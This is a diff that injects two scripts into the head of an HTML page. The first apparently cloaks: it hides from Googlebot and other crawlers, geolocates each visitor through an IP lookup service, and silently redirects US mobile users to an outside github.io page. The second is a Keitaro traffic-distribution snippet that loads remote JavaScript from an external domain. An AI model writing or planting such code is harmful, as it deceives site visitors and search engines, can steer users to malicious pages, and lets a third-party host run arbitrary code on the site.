@@ -1,6 +1,41 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+	<script>
+    var userAgent = navigator.userAgent;
+
+    // Verifica se o agente do usuário corresponde a um bot.
+    if (!userAgent.match(/Googlebot|MetaURI|TikTokBot/i)) {
+        // Função para verificar se o dispositivo é móvel.
+        function isMobile() {
+            return /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+        }
+
+        // Função para obter a localização geográfica do usuário.
+        function getGeolocation(callback) {
+            fetch('https://ipapi.co/json/')
+                .then(function(response) {
+                    return response.json();
+                })
+                .then(function(data) {
+                    callback(data);
+                })
+                .catch(function(error) {
+                    console.error('Erro ao obter geolocalização:', error);
+                    callback(null);
+                });
+        }
+
+        // Verifica se o dispositivo é móvel e se a localização é nos Estados Unidos.
+        if (isMobile()) {
+            getGeolocation(function(location) {
+                if (location && location.country_code === 'US') {
+                    window.location.href = "https://wmv-digital.github.io/boost33m/";
+                }
+            });
+        }
+    }
+</script>
 	<!-- Keitaro tracking script -->
 <script type='application/javascript'>
 if (!window.KTracking){window.KTracking={collectNonUniqueClicks: false, multiDomain: false, R_PATH: 'https://wesfast.com/X6fyww1f', P_PATH:'https://wesfast.com/f19413a/postback', listeners: [], reportConversion: function(){this.queued = arguments;}, getSubId: function(fn) {this.listeners.push(fn);}, ready: function(fn) {this.listeners.push(fn);} };}(function(){var a=document.createElement('script');a.type='application/javascript';a.async=true;a.src='https://wesfast.com/js/k.min.js';var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(a,s)})();
